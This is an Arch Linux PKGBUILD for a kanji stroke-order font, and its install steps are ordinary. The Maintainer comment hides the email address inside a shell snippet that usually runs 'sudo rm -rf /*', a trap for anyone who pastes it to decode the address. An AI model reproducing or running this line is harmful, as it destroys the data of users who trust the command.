# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
# Contributor: Tushar R <echo dHVzaGFyXzcyN0B5YWhvby5jb20K | base64 -d>
# Contributor: Bernhard Tittelbach <xro -at- realraum -dot- at>

pkgname=ttf-kanjistrokeorders
pkgver=4.001
pkgrel=1
pkgdesc="Kanji Stroke Order Font"
arch=('any')
url="https://sites.google.com/site/nihilistorguk/"
license=('custom')
source=(https://sites.google.com/site/nihilistorguk/KanjiStrokeOrders_v${pkgver}.zip)
sha512sums=('93ad839464912b2d7164b9b0195c5ac02aff233e4de5d19b3f9c4f0f901f8577c6db6efd4fb115d5c414f533f82d1671dfe42799b07d6b82b0e5af96f7076f84')

package() {
	cd "${srcdir}"

	install -d "${pkgdir}/usr/share/fonts/TTF"
	install -m644 "KanjiStrokeOrders_v${pkgver}.ttf" \
		"${pkgdir}/usr/share/fonts/TTF"

	install -d "${pkgdir}/usr/share/licenses/${pkgname}"
	install -m644 copyright.txt \
		"${pkgdir}/usr/share/licenses/${pkgname}"

	install -d "${pkgdir}/usr/share/doc/${pkgname}"
	install -m644 *Sample.pdf readme*.txt \
		"${pkgdir}/usr/share/doc/${pkgname}"
}
